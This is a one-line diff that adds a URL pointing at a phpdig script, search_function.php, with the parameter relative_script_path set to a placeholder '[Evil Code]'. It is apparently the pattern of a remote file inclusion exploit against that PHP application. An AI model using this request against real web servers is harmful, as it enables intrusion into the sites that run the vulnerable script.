@@ -1,0 +1,1 @@
+http://www.example.com/path/includes/phpdig/libs/search_function.php?relative_script_path=[Evil Code]
